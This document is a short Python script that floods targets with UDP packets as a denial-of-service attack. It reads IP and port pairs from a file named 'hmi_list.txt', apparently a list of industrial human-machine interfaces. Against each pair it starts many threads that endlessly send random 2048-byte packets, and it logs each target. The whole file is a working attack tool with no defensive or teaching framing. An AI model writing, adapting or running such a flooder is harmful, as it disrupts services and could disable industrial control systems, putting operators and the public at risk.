import subprocess
import threading
import time
import socket
import random

bytes = random._urandom(2048)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = 0

def DDos(ip, port):
    global sent, bytes
    while True:
        a = sock.sendto(bytes, (ip, port))

def attack(ip, port):
    print(f"Attacking --> {ip}:{port}")
    write_to_file(ip, port)
    for i in range(20):
        threading.Thread(target=DDos, args=[ip.strip('\''), int(port)]).start()

def clear_file():
    with open("./res.txt", "w") as f:
        f.write("")

#write to file
def write_to_file(ip, port):
    with open("./res.txt", "a") as f:
        f.write(f"Attacking --> {ip}:{port}\n")

# read list from file
def read_from_file():
    l = []
    with open("./hmi_list.txt", "r") as f:
        for line in f:
            ip = line.strip()
            l.append(ip.strip('()').split(","))
    return l

def attack_network():
    print("[+] Start attacking HMI...")
    for (ip, port) in read_from_file():
        while threading.active_count() > 400:
            pass
        print(f"Start attack --> {ip}:{port}")
        threading.Thread(target=attack, args=[ip, port]).start()
    clear_file()
    print("[+] attacking done")

attack_network()